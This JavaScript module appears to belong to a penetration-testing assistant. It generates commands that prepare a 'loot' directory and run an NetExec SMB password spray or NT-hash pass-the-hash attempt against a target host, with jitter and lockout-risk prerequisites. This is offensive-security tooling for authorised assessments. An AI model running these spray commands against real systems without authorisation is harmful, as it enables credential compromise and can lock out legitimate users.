import { buildUsersFileCommand } from "./userCommands.js";

const shellQuote = (value) => `'${String(value).replaceAll("'", "'\"'\"'")}'`;

export function buildSprayCommands(workspace, selectedAccount) {
  if (!selectedAccount?.id || !selectedAccount.secret?.trim()) return [];
  const root = "{{workspaceRoot}}/{{targetSlug}}/loot/credential-spray";
  const usersFile = "{{workspaceRoot}}/{{targetSlug}}/loot/users.txt";
  const secret = selectedAccount.secret.trim();
  const isHash = /^[a-f0-9]{32}$/iu.test(secret);
  return [
    buildUsersFileCommand(workspace),
    {
      key: `spray-output-directory-${selectedAccount.id}`,
      label: "Prepare the target-scoped spray evidence directory",
      value: `mkdir -p "${root}"`,
      resultCategory: "preparation",
      requiresSelectedCredential: true,
    },
    {
      key: isHash ? `spray-one-hash-${selectedAccount.id}` : `spray-one-password-${selectedAccount.id}`,
      label: `${isHash ? "Test one selected NT hash" : "Spray one selected password"} with jitter — lockout risk`,
      value: `nxc smb {{rhost}} -u "${usersFile}" ${isHash ? "-H" : "-p"} ${shellQuote(secret)} --continue-on-success --jitter {{sprayJitter}} --log "${root}/selected-credential.log"`,
      resultCategory: "access",
      requiresSelectedCredential: true,
      prerequisites: [
        "Select exactly one saved credential for this machine.",
        "Confirm the domain lockout threshold, duration, and observation window.",
        "Run and review the separate target-scoped username-file and evidence-directory cards first.",
      ],
    },
  ];
}
